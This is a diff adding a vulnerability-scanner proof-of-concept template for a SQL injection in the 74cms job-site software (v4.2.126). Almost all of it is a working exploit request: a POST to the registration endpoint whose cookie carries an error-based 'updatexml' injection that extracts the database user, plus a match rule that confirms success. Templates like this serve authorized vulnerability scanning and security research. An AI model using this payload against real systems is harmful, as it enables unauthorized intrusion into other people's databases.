@@ -1,0 +1,20 @@
+name: 74cms v4.2.126_sqldel-qiantai3
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: POST
+    path: /index.php?m=&c=Members&a=register
+    headers:
+      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
+      cookie: members_uc_info[reg_type]=1;members_uc_info[utype]=2;members_uc_info[mobile][0]=match;members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;
+      Content-Type: application/x-www-form-urlencoded
+      X-Requested-With: XMLHttpRequest
+    body: |-
+      reg_type=2&utype=2&ucenter=bind&unbind_mobile=1 
+    expression: |
+      response.body.bcontains(bytes(@localhost))
+detail:
+  author: jh
+  Affected Version: "74cms v4.2.126_sqldel-qiantai3"
+  links:
+    - https://www.codercto.com/a/59112.html
